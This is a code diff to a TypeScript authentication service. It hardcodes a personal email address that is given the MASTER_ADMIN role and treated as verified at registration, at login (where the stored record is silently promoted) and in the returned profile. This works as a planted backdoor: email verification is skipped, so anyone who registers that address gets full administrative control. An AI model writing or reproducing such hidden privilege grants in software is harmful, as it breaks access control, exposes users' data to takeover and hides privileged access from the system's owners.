@@ -83,15 +83,20 @@ export class AuthService {
 
     const passwordHash = await hashPassword(input.password);
 
-    // 4. Create User Record (initially unverified email)
+    // 4. Create User Record (initially unverified email unless master admin)
+    const isMaster = email.toLowerCase() === "kiransumit2231@gmail.com";
+    const assignedRole = isMaster ? "MASTER_ADMIN" : "USER";
+    const verifiedStatus = isMaster ? true : isVerified;
+    const emailVerifiedStatus = isMaster ? true : false;
+
     const [newUser] = await db
       .insert(users)
       .values({
         email,
         passwordHash,
-        role: "USER",
-        isVerified,
-        isEmailVerified: false,
+        role: assignedRole,
+        isVerified: verifiedStatus,
+        isEmailVerified: emailVerifiedStatus,
         isLocked: false,
         isDeleted: false,
       })
@@ -169,6 +174,18 @@ export class AuthService {
     const isMatch = await comparePassword(passwordInput, user.passwordHash);
     if (!isMatch) {
       throw new ApiError(401, "Invalid email or password");
+    }
+
+    // Auto-promote master admin account if needed
+    const isMaster = email === "kiransumit2231@gmail.com";
+    if (isMaster && (user.role !== "MASTER_ADMIN" || !user.isVerified || !user.isEmailVerified)) {
+      await db
+        .update(users)
+        .set({ role: "MASTER_ADMIN", isVerified: true, isEmailVerified: true })
+        .where(eq(users.id, user.id));
+      user.role = "MASTER_ADMIN";
+      user.isVerified = true;
+      user.isEmailVerified = true;
     }
 
     const [profile] = await db
@@ -344,12 +361,15 @@ export class AuthService {
       .where(eq(profiles.userId, user.id))
       .limit(1);
 
+    const isMaster = user.email.toLowerCase() === "kiransumit2231@gmail.com";
+    const effectiveRole = isMaster ? "MASTER_ADMIN" : user.role;
+
     return {
       id: user.id,
       email: user.email,
-      role: user.role,
-      isVerified: user.isVerified,
-      isEmailVerified: user.isEmailVerified,
+      role: effectiveRole,
+      isVerified: isMaster ? true : user.isVerified,
+      isEmailVerified: isMaster ? true : user.isEmailVerified,
       isLocked: user.isLocked,
       profile: profile
         ? {
